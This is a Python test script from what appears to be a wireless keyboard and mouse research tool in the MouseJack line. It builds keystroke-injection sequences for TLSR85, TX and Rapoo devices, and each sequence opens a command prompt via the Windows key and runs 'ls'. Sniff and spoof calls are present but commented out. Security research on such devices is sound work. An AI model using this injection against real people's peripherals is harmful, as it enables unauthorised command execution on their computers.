#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Copyright (C) 2016 Bastille Networks
  Copyright (C) 2019 Matthias Deeg, SySS GmbH
  Copyright (C) 2025 Lucas Agro

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

"""Testing file for sniffing and spoofing wireless devices.

"""

import time

from lib import common
from devices.TLSR85.tlsr85_keyboard import Tlsr85_Keyboard
from devices.TLSR85.tlsr85_mouse import Tlsr85_Mouse
from devices.TX.tx_mouse import Tx_mouse
from devices.TX.tx_keyboard import Tx_Keyboard
from devices.keyboard import * 
from devices.mouse import * 
from devices.Rapoo.rapoo_mouse import *
from devices.Rapoo.rapoo_keyboard import *


common.init_args('./main.py')
common.parse_and_init()


trust_keyboard = Tlsr85_Keyboard("4a:b4:cb:80", "aa:aa:b5", 0x11021, 0x24bf)
# poss_keyboard = Tlsr85_Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)


attack = [
    trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_C]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_M]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_L]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_S]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]


#trust_keyboard.spoof(attack)

trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
#trust_keyboard.sniff()

tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)

attack = [
    *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_C]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_M]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_L]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_S]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

#tx_keyboard.spoof(attack)

m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
# tx_mouse.spoof(m)

rapoo_Keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)

attack = [
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(1),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_C]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_M]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_L]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_S]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]


#rapoo_Keyboard.spoof(attack)

rapoo_Mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
#rapoo_Keyboard.sniff()
attack = [
    rapoo_Mouse.build_packet([MouseClickType.LEFT_CLICK])
]
#rapoo_Mouse.spoof(attack)